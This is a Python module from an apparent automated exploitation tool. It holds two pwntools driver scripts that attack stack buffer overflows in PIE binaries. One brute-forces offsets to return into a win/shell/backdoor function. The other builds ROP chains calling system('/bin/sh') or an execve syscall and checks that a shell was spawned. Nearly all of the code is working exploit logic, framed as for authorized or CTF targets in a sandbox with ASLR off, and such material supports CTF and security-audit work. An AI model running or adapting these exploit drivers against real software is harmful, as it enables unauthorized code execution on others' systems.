"""ret2win on PIE binaries, verified by execution.

PIE randomizes the base, so win()'s address is base+offset. With ASLR disabled in the
sandbox the base is fixed; we resolve it (io.libs / /proc maps / the standard ASLR-off PIE
base), search the stack offset and alignment, jump to win() and confirm it. For AUTHORIZED /
CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, os, time
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
win_off = None
for n, a in (elf.symbols or {}).items():
    if n == "win" or n.endswith("win") or n in ("shell", "backdoor"):
        win_off = a; break
if win_off is None:
    print("NO_WIN"); sys.exit(1)
try:
    ret_off = ROP(elf).find_gadget(["ret"]).address
except Exception:
    ret_off = None
def _try_resolve(io):
    for path, b in (io.libs() or {}).items():
        if os.path.basename(path) == os.path.basename(elf.path) and b:
            return b
    try:
        bases = [int(line.split("-")[0], 16) for line in open("/proc/%d/maps" % io.pid)
                 if os.path.basename(elf.path) in line]
        if bases:
            return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
    except Exception:
        pass
    return None
def resolve_base(io):
    # ver _DRIVER_ROP: poll con pausa corta, no una sola lectura (ventana de arranque
    # intermitente bajo algunos backends del sandbox, p.ej. static-PIE via Rosetta).
    for _ in range(8):
        b = _try_resolve(io)
        if b is not None:
            return b
        time.sleep(0.15)
    return 0x555555554000
MARK = b"win reached"
# ver _DRIVER_ROP para el por que de RETRIES: resolve_base() puede fallar a atrapar la
# direccion real por pura ventana de tiempo (confirmado con un static-PIE traducido via Rosetta
# en vez de qemu-user), no solo por offset/alineacion incorrectos.
RETRIES = 3
for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48]:
    for a in (1, 0):
        for _attempt in range(RETRIES):
            io = process([elf.path], aslr=False)
            base = resolve_base(io)
            chain = b"A" * off + (p64(base + ret_off) if (a and ret_off is not None) else b"") + p64(base + win_off)
            io.sendline(chain)
            out = io.recvrepeat(1.0)
            io.close()
            if MARK in out:
                print("VERIFIED off=%d base=%#x win=%#x" % (off, base, base + win_off))
                sys.exit(0)
print("NOT_VERIFIED"); sys.exit(1)
'''


_DRIVER_ROP = r'''
import sys, os, time
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
def _try_resolve(io):
    for path, b in (io.libs() or {}).items():
        if os.path.basename(path) == os.path.basename(elf.path) and b:
            return b
    try:
        bases = [int(line.split("-")[0], 16) for line in open("/proc/%d/maps" % io.pid)
                 if os.path.basename(elf.path) in line]
        if bases:
            return min(bases) & ~0xfff       # lowest mapping = ELF load base (not the r-xp seg)
    except Exception:
        pass
    return None
def resolve_base(io):
    # POLL, no una sola lectura: bajo algunos backends del sandbox (confirmado con un binario
    # static-PIE traducido via Rosetta en Apple Silicon Docker Desktop en vez de qemu-user),
    # /proc/pid/maps solo muestra el mapeo REAL del ELF (en vez de solo el wrapper del
    # traductor) durante una ventana de arranque breve e intermitente. Reintentar la LECTURA
    # varias veces con una pausa corta, dentro del MISMO proceso ya lanzado, cierra esa ventana
    # de forma mucho mas fiable que relanzar procesos nuevos de cero cada vez.
    for _ in range(8):
        b = _try_resolve(io)
        if b is not None:
            return b
        time.sleep(0.15)
    return 0x555555554000
MARK = b"BINORACLE_PWNED"
# ASLR is off in the sandbox, so once we resolve the (fixed) PIE base every gadget/string is
# at base+offset; we rebase the ELF, build a ROP chain and confirm a real shell via MARK.
# Ademas del poll en resolve_base(), unos pocos reintentos POR offset (no solo mas offsets)
# cubren el caso raro en que incluso el poll no atrapa la ventana buena.
RETRIES = 3
for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48, 152, 168, 200]:
    for _attempt in range(RETRIES):
        io = process([elf.path], aslr=False)
        base = resolve_base(io)
        elf.address = base                      # rebases symbols, gadgets and search() to absolute
        binsh = next(elf.search(b"/bin/sh\x00"), None)
        rop = ROP(elf)
        built = False
        try:
            sysaddr = (elf.plt.get("system") if elf.plt else None) or (elf.symbols or {}).get("system")
            if binsh is not None and sysaddr:
                try: rop.raw(rop.find_gadget(["ret"]).address)
                except Exception: pass
                rop.call(sysaddr, [binsh]); built = True         # ret2libc system('/bin/sh')
            elif binsh is not None:
                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
                if sc: rop.raw(sc.address); built = True          # execve('/bin/sh') syscall
        except Exception:
            built = False
        if not built:
            io.close(); break                   # gadgets/binsh missing: retrying won't help, next offset
        try:
            chain = rop.chain()
        except Exception:
            io.close(); break
        try:
            io.sendline(b"A" * off + chain)
            time.sleep(0.5); io.sendline(b"echo " + MARK)
            out = io.recvrepeat(2.5)                 # generous: the audit runs many sandboxes, load is high
        except Exception:
            out = b""
        io.close()
        if MARK in out:
            print("VERIFIED off=%d base=%#x strategy=rop-pie" % (off, base)); sys.exit(0)
print("NOT_VERIFIED"); sys.exit(1)
'''


def _run_pie_driver(binary: str, driver: str, tmpname: str) -> dict:
    """Shared runner: write `driver` next to the binary and execute it, preferring the
    binoracle-pwn Docker image and falling back to the native sandbox (ASLR off, no network,
    rlimits) when the image is absent. Returns {ok, verified, detail, output, engine}."""
    return run_driver(binary, driver, tmpname)


def autopie_rop(binary: str, run: bool = True) -> dict:
    """ROP-to-shell on a PIE binary, verified by execution. Resolves the (ASLR-off) PIE base in
    the sandbox, rebases the ELF, builds a ret2libc-system or execve-syscall ROP chain with
    absolute addresses and confirms a real shell. Needs '/bin/sh' present and enough gadgets;
    otherwise reports not-applicable. For AUTHORIZED / CTF targets."""
    res = _run_pie_driver(binary, _DRIVER_ROP, ".binoracle_pie_rop.py")
    if not res.get("ok"):
        return res
    res["note"] = ("ROP en PIE: base resuelta y shell verificada en sandbox" if res.get("verified")
                   else "ROP en PIE: no verificado (offset/gadget o timing bajo carga)")
    return res


def autopie_ret2win(binary: str, run: bool = True) -> dict:
    """ret2win on a PIE binary, verified by execution (shares the sandbox runner)."""
    res = _run_pie_driver(binary, _DRIVER, ".binoracle_pie.py")
    if res.get("ok"):
        res["note"] = "ret2win en PIE (base resuelta, shell/win verificada en sandbox)"
    return res
